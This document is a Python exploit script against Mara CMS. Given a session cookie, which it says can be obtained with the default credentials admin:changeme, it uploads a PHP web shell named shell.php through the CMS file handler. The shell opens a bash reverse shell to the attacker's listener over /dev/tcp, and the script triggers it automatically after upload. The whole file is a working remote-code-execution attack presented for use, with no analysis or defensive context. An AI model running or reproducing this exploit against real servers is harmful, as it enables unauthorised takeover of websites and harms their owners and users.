import requests, argparse

parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", help="The path to the Mara CMS instance. EX: --url http://127.0.0.1", required=True)
parser.add_argument("-li", "--local-ip", help="The local IP address of your listener", required=True)
parser.add_argument("-lp", "--local-port", help="The local port of your listener", required=True)
parser.add_argument("-c", "--cookie", help="Your cookie. Login to the site & grab it. Default credentials are: admin:changeme", required=True)
args = parser.parse_args()

targetUrl = ""
if args.url.endswith("/"):
    targetUrl = args.url + "cms/codebase/handler.php"
else:
    targetUrl = args.url + "/cms/codebase/handler.php"

print("[+] Target url: " + targetUrl)

def sendReq(targetUrl):
	cookiesSplit = args.cookie.split("=")
	cookies = {cookiesSplit[0]: cookiesSplit[1],}
	headers = {
	    'Host': args.url.split("/")[2],
	    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
	    'Accept-Language': 'en-US,en;q=0.5',
	    'Content-Type': 'multipart/form-data; boundary=---------------------------4238234754173168879593736689',
	    'Origin': args.url,
	    'Connection': 'close',
	    'Referer': args.url,
	    'Upgrade-Insecure-Requests': '1',
	}

	data = '-----------------------------4238234754173168879593736689\r\nContent-Disposition: form-data; name="authenticated"\r\n\r\nMQ==\r\n-----------------------------4238234754173168879593736689\r\nContent-Disposition: form-data; name="action"\r\n\r\ndXBsb2Fk\r\n-----------------------------4238234754173168879593736689\r\nContent-Disposition: form-data; name="MAX_FILE_SIZE"\r\n\r\n10485760\r\n-----------------------------4238234754173168879593736689\r\nContent-Disposition: form-data; name="type"\r\n\r\nfilenew\r\n-----------------------------4238234754173168879593736689\r\nContent-Disposition: form-data; name="files[]"; filename="shell.php"\r\nContent-Type: application/x-php\r\n\r\n<?php\nexec("/bin/bash -c \'bash -i >& /dev/tcp/{0}/{1} 0>&1\'");?>\n\r\n-----------------------------4238234754173168879593736689\r\nContent-Disposition: form-data; name="usr"\r\n\r\nYWRtaW4=\r\n-----------------------------4238234754173168879593736689\r\nContent-Disposition: form-data; name="pwd"\r\n\r\nYzNlMzk5YmY3YThmOTg3YjY4MThjYTQ4ZWI5NjNjY2E0NDM3ZjBmNTkyZTQ3MGUyZmRlYTI5N2EwMDA4OTQ0OQ==\r\n-----------------------------4238234754173168879593736689\r\nContent-Disposition: form-data; name="authenticated"\r\n\r\nMQ==\r\n-----------------------------4238234754173168879593736689\r\nContent-Disposition: form-data; name="destdir"\r\n\r\nblog/\r\n-----------------------------4238234754173168879593736689--\r\n'.format(args.local_ip, args.local_port)

	response = requests.post(targetUrl, cookies=cookies, headers=headers, data=data, verify=False)
	if "uploaded" in response.text:
		print("[+] Reverse shell uploaded! Triggering reverse shell...")
		
		if args.url.endswith("/"):
			shellUrl = args.url + "cms/blog/shell.php"
		else:
			shellUrl = args.url + "/cms/blog/shell.php"
		
		response2 = requests.get(shellUrl, cookies=cookies, headers=headers, verify=False)
	else:
		print("[!] There was a problem uploading the reverse shell!")
		print(response.text)


sendReq(targetUrl)
